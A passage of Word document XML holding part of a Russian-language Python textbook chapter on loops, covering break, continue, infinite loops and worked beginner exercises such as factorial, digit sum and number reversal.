          <w:b/>
        </w:rPr>
        <w:t>Почему до \(\sqrt{n}\)?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Потому что если у числа есть делитель больше \(\sqrt{n}\), то обязательно есть делитель меньше \(\sqrt{n}\). Например, для 36: \(36 = 6 \times 6\), \(36 = 4 \times 9\), \(36 = 2 \times 18\). Все делители больше 6 имеют парные делители меньше 6. Так что проверять дальше 6 смысла нет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Треугольник из звёздочек</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вывести треугольник:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>*</w:t>
        <w:br/>
        <w:t>**</w:t>
        <w:br/>
        <w:t>***</w:t>
        <w:br/>
        <w:t>****</w:t>
        <w:br/>
        <w:t>*****</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Python:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = 5</w:t>
        <w:br/>
        <w:t>for i in range(1, n + 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for j in range(i):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("*", end="")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пошаговое выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>i = 1: выводим 1 звёздочку</w:t>
        <w:br/>
        <w:t>i = 2: выводим 2 звёздочки</w:t>
        <w:br/>
        <w:t>i = 3: выводим 3 звёздочки</w:t>
        <w:br/>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.8. Операторы управления циклом: break и continue</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>break (досрочный выход из цикла)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>break</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — немедленно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прерывает выполнение цикла</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и выходит из него.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Поиск первого делителя числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = int(input("Введите число: "))</w:t>
        <w:br/>
        <w:t>for i in range(2, n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if n % i == 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"Первый делитель: {i}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break  # Нашли делитель, дальше искать не нужно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: 100</w:t>
        <w:br/>
        <w:t>Первый делитель: 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Без `break` цикл продолжил бы перебирать все числа от 2 до 99, хотя ответ уже найден.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>continue (переход к следующей итерации)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>continue</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пропускает оставшуюся часть тела цикла</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и переходит к следующей итерации.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Вывод только нечётных чисел от 1 до 10</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for i in range(1, 11):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if i % 2 == 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        continue  # Пропускаем чётные числа</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(i)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
        <w:br/>
        <w:t>3</w:t>
        <w:br/>
        <w:t>5</w:t>
        <w:br/>
        <w:t>7</w:t>
        <w:br/>
        <w:t>9</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Без continue (альтернативный способ):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for i in range(1, 11):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if i % 2 != 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(i)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Оба способа работают одинаково. `continue` полезен, когда нужно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пропустить сложную логику</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для некоторых элементов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Разница между break и continue</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Оператор   | Действие                               | Когда использовать                      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ---------- | -------------------------------------- | --------------------------------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>break</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  | Выход из цикла                         | Найден ответ, дальше искать не нужно    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>continue</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Переход к следующей итерации          | Пропустить текущий элемент              |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Поиск и вывод всех простых чисел до 50</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>for n in range(2, 51):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    is_prime = True</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for i in range(2, int(n**0.5) + 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if n % i == 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            is_prime = False</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break  # Нашли делитель, n не простое</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if is_prime:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(n)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.9. Бесконечные циклы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое бесконечный цикл?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Бесконечный цикл</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это цикл, который </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>никогда не завершается</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (условие всегда истинно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример (нарочно):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>while True:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Привет")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Этот цикл будет выводить "Привет" </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>вечно</w:t>
      </w:r>
      <w:r>
        <w:t>, пока ты не нажмёшь `Ctrl+C` (прерывание программы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Когда бесконечные циклы полезны?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Серверы** — слушают запросы постоянно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Игровые циклы** — игра работает, пока игрок не закроет её</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Операционные системы** — работают "бесконечно"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Меню программы** — повторяется, пока пользователь не выберет "Выход"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Меню программы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>while True:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("\nМеню:")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("1. Сложение")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("2. Вычитание")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("3. Выход")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    choice = int(input("Выбор: "))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    if choice == 1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        a = float(input("a = "))</w:t>
        <w:br/>
        <w:t xml:space="preserve">        b = float(input("b = "))</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"Сумма: {a + b}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    elif choice == 2:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        a = float(input("a = "))</w:t>
        <w:br/>
        <w:t xml:space="preserve">        b = float(input("b = "))</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"Разность: {a - b}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    elif choice == 3:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("Выход из программы")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break  # Выход из бесконечного цикла</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("Неверный выбор")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Меню:</w:t>
        <w:br/>
        <w:t>1. Сложение</w:t>
        <w:br/>
        <w:t>2. Вычитание</w:t>
        <w:br/>
        <w:t>3. Выход</w:t>
        <w:br/>
        <w:t>Выбор: 1</w:t>
        <w:br/>
        <w:t>a = 5</w:t>
        <w:br/>
        <w:t>b = 3</w:t>
        <w:br/>
        <w:t>Сумма: 8</w:t>
        <w:br/>
        <w:br/>
        <w:t>Меню:</w:t>
        <w:br/>
        <w:t>1. Сложение</w:t>
        <w:br/>
        <w:t>2. Вычитание</w:t>
        <w:br/>
        <w:t>3. Выход</w:t>
        <w:br/>
        <w:t>Выбор: 3</w:t>
        <w:br/>
        <w:t>Выход из программы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как избежать нежелательных бесконечных циклов?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Частая ошибка новичков:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>i = 1</w:t>
        <w:br/>
        <w:t>while i &lt;= 10:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(i)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # Забыли написать i += 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Переменная `i` </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не изменяется</w:t>
      </w:r>
      <w:r>
        <w:t>, условие `i &lt;= 10` всегда истинно → бесконечный цикл.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правильно:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>i = 1</w:t>
        <w:br/>
        <w:t>while i &lt;= 10:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(i)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    i += 1  # Не забывай!</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.10. Примеры задач</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Теперь давайте разберём </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10 задач</w:t>
      </w:r>
      <w:r>
        <w:t>, которые показывают применение всех трёх конструкций.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 1: Факториал числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вычислить \(n!\).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = int(input("n = "))</w:t>
        <w:br/>
        <w:t>result = 1</w:t>
        <w:br/>
        <w:t>for i in range(1, n + 1):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result *= i</w:t>
        <w:br/>
        <w:t>print(f"{n}! = {result}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = 6</w:t>
        <w:br/>
        <w:t>6! = 720</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 2: Сумма цифр числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти сумму цифр числа. Например, для 1234 сумма = 1 + 2 + 3 + 4 = 10.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём последнюю цифру: `n % 10`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Прибавляем к сумме</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отбрасываем последнюю цифру: `n = n // 10`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Повторяем, пока `n != 0`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = int(input("Введите число: "))</w:t>
        <w:br/>
        <w:t>total = 0</w:t>
        <w:br/>
        <w:t>while n &gt; 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    total += n % 10</w:t>
        <w:br/>
        <w:t xml:space="preserve">    n //= 10</w:t>
        <w:br/>
        <w:t>print(f"Сумма цифр: {total}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: 1234</w:t>
        <w:br/>
        <w:t>Сумма цифр: 10</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пошаговое выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = 1234: последняя цифра = 4, total = 4, n = 123</w:t>
        <w:br/>
        <w:t>n = 123:  последняя цифра = 3, total = 7, n = 12</w:t>
        <w:br/>
        <w:t>n = 12:   последняя цифра = 2, total = 9, n = 1</w:t>
        <w:br/>
        <w:t>n = 1:    последняя цифра = 1, total = 10, n = 0</w:t>
        <w:br/>
        <w:t>n = 0 → выход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 3: Реверс числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Перевернуть число. Например, 1234 → 4321.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Берём последнюю цифру: `digit = n % 10`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Добавляем к результату: `reversed = reversed × 10 + digit`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Отбрасываем последнюю цифру: `n = n // 10`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Повторяем, пока `n != 0`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = int(input("Введите число: "))</w:t>
        <w:br/>
        <w:t>reversed_n = 0</w:t>
        <w:br/>
        <w:t>while n &gt; 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    reversed_n = reversed_n * 10 + n % 10</w:t>
        <w:br/>
        <w:t xml:space="preserve">    n //= 10</w:t>
        <w:br/>
        <w:t>print(f"Перевёрнутое: {reversed_n}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: 1234</w:t>
        <w:br/>
        <w:t>Перевёрнутое: 4321</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пошаговое выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = 1234: digit = 4, reversed = 0×10 + 4 = 4, n = 123</w:t>
        <w:br/>
        <w:t>n = 123:  digit = 3, reversed = 4×10 + 3 = 43, n = 12</w:t>
        <w:br/>
        <w:t>n = 12:   digit = 2, reversed = 43×10 + 2 = 432, n = 1</w:t>
        <w:br/>
        <w:t>n = 1:    digit = 1, reversed = 432×10 + 1 = 4321, n = 0</w:t>
        <w:br/>
        <w:t>n = 0 → выход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Задача 4: Числа Фибоначчи</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вывести первые n чисел Фибоначчи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
